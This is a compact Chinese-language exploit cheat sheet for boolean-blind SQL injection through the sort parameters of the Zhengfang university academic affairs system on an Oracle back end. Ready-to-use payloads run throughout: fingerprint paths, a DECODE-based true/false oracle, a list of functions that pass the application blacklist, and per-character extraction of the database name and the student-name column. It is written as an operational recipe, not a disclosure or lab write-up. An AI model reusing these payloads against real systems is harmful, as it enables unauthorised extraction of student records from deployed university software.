# 正方教务 ORDER BY 布尔盲注 (sortName/sortOrder) (≤50行)

## 指纹
- 路径 `/jwglxt/cjcx/cjcx_cxDgXscj.html`(成绩查询)/ `/eams/` / `teachPlanSearch.action`
- 参数 `queryModel.sortName` + `queryModel.sortOrder` / `orderBy` / `sort`
- 响应 `items[].kch/kcmc`,Oracle 后端

## 一击判定
```
sortName=kch&sortOrder=desc → 首行 kch 反转 → 排序直拼确认
sortName=1/2/3 → 列序号可用 → ORDER BY <表达式>
```

## 布尔盲注 oracle
```
sortName=DECODE(<条件>,<真值>,kch,kcmc)
真 → 按 kch 排序 → 首行 kch=01060110
假 → 按 kcmc 排序 → 首行 kch=050688
```
- NVL2(NULL,...)/NULLIF 同样可作双分支
- 判定只看 `items[0].kch`,不必管完整响应

## 函数可用性矩阵(应用层黑名单)
- ✅ 可用: DECODE NVL2 NULLIF LENGTH ASCII SUBSTR TO_NUMBER ORA_DATABASE_NAME SYSDATE 列引用(xm 等)
- ❌ 被拦: SELECT FROM CASE WHEN USER UID INSTR SYS_CONTEXT USERENV TO_CHAR DBMS_RANDOM 字符串字面量'xx'
- SELECT 绕过全失败: 大小写混合 / /**/ / 制表符 / 加号

## 逐位提取
```
DB名长度:   DECODE(LENGTH(ORA_DATABASE_NAME),4,kch,kcmc)
第N位ASCII: DECODE(ASCII(SUBSTR(ORA_DATABASE_NAME,N,1)),79,kch,kcmc)
业务列:     DECODE(ASCII(SUBSTR(xm,N,1)),<ascii>,kch,kcmc) / LENGTH(xm)
```
- 字符串字面量被拦 → 必须 ASCII 数值盲注,不用引号比较

## 影响边界
- 能读: 内置函数值(DB名)+ 当前查询表列值
- 不能: 跨表 SELECT dump(子查询封死)→ 影响≤中危,除非列含敏感数据
- 错误回显"出错啦"= 应用层黑名单,非独立 WAF

## 绕坑
- Cookie 必须带完整会话(JSESSIONID + zftal-ui),缺失返回空 items
- sortOrder 单独可注入反转(desc 生效),但黑名单对 sortName 更严
- 负对照必测(1=1真/1=2假/P越界假),排除恒真
